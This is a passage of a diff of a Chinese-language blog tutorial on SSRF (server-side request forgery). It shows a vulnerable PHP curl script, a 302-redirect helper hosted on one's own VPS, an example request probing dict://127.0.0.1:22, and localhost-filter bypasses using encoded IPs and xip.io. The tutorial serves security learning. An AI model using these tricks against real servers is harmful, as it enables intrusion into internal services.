-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_exec($ch);
-curl_close($ch);
-}
-
-$url = $_GET[&#39;url&#39;];
-curl($url);
-?&gt;</code></pre><p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
-<p>302辅助跳转脚本：</p>
-<pre><code>&lt;?php  
-$schema = $_GET[&#39;schema&#39;];
-$ip     = $_GET[&#39;ip&#39;];
-$port   = $_GET[&#39;port&#39;];
-$query  = $_GET[&#39;query&#39;];
-
-echo &quot;\n&quot;;
-echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;
-
-if(empty($port)){  
-    header(&quot;Location: $schema://$ip/$query&quot;);
-} else {
-    header(&quot;Location: $schema://$ip:$port/$query&quot;);
-}</code></pre><p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
-<pre><code>http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</code></pre><p>注意是POST请求还是GET请求</p>
-<h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
-<h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
-<h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">利用 gopher 协议拓展攻击面</a></p>
-<p><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">浅析SSRF原理及利用方式</a></p>
-<p><a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/10/初探ssrf/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
